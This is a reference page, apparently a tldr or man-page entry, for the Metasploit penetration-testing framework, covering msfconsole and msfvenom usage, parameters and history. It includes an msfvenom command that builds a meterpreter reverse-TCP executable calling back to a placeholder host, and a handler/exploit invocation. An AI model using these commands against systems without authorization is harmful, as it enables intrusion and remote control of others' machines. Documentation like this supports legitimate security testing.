# TAGLINE

penetration testing platform for developing, testing, and executing exploits

# TLDR

**Start Metasploit** console

```msfconsole```

**Start without** banner

```msfconsole -q```

**Execute** a resource script at startup

```msfconsole -r [script.rc]```

**Initialize** the database

```msfdb init```

**Run a specific module** with inline commands

```msfconsole -x "use [exploit/multi/handler]; set RHOSTS [target]; run"```

**Generate a payload** with msfvenom

```msfvenom -p [windows/meterpreter/reverse_tcp] LHOST=[ip] LPORT=[port] -f [exe] -o [payload.exe]```

**List available payloads**

```msfvenom --list payloads```

**Search for modules** by keyword

```msfconsole -q -x "search [type:exploit] [platform:windows]"```

# SYNOPSIS

**msfconsole** [_options_]

# PARAMETERS

**-q**, **--quiet**
> Don't print banner.

**-r** _file_
> Resource script file.

**-x** _cmd_
> Execute command.

**-o** _file_
> Output to file.

**-L**
> List all available modules, payloads, encoders, or nops.

**-n** _nopsled_
> Prepend a nopsled of given size to the payload.

**-e** _encoder_
> Encoder to use.

**-p** _payload_
> Payload to use (msfvenom).

**-f** _format_
> Output format (msfvenom): exe, elf, raw, python, c, etc.

# DESCRIPTION

**Metasploit Framework** is a penetration testing platform for developing, testing, and executing exploits. It includes a large database of public exploits and payloads for security testing.

The framework includes msfconsole (interactive shell), msfvenom (payload generator), and auxiliary tools.

# COMMON COMMANDS

```
search <term>     - Search modules
use <module>      - Select module
info              - Module details
show options      - Display module options
set <opt> <val>   - Set option
run / exploit     - Execute module
sessions          - List active sessions
back              - Exit current module
```

# CAVEATS

Requires authorization for use. Database setup recommended. Regular updates needed. Antivirus may flag payloads.

# HISTORY

Metasploit was created by **H.D. Moore** in **2003** as a portable network tool. It was acquired by **Rapid7** in **2009** and remains the most popular penetration testing framework.

# SEE ALSO

[nmap](/man/nmap)(1), [nikto](/man/nikto)(1), [sqlmap](/man/sqlmap)(1), [hydra](/man/hydra)(1), [wireshark](/man/wireshark)(1)
